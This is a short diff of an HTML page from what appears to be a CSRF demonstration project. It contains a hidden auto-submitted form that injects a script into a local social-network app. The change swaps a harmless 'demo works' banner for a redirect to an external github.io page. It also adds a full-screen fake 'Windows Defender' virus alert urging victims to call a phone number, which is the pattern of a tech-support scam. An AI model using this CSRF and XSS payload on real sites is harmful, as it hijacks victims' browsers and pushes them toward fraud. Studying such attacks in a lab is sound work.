@@ -11,7 +11,7 @@
 
 <!-- Formulaire envoyé automatiquement -->
 <form id="autoPost" action="http://localhost/SocialNetworkHack/index.php" method="POST">
-    <input type="hidden" name="content" value="&lt;script>document.body.innerHTML = ` &lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%; background:red;color:white;font-size:40px;display:flex;justify-content:center;align-items:center;z-index:99999;&quot;>La démo fonctionne &lt;/div>`;&lt;/script>window.location.href = "http://localhost/SocialNetworkHack/index.php";">
+    <input type="hidden" name="content" value="&lt;script> window.location.replace(&quot;https://johnmclf.github.io/CsrfAttack_exemple/index.html&quot;);&lt;/script>&lt;script>document.body.innerHTML = ` &lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%; background:red;color:white;font-size:40px;display:flex;justify-content:center;align-items:center;z-index:99999;&quot;>Windows Defender : « Un virus a été détecté, veuillez contacter le numéro suivant : 01 23 56 99 12 &lt;/div>`;&lt;/script>">
 </form>
 
 <script>
